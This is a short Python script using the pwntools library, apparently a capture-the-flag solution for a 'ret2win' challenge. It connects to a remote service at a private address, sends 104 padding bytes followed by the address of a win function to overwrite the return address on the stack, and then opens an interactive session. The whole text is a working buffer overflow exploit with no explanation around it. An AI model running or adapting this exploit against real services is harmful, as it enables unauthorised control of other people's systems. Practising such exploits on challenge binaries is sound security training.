from pwn import *

p = remote("10.212.173.64", 32209)
# p = process("./ret2win")

win = 0x4011d1
p.recvuntil(b"data: ")
p.sendline(b"A"*104+p64(win))
p.interactive()
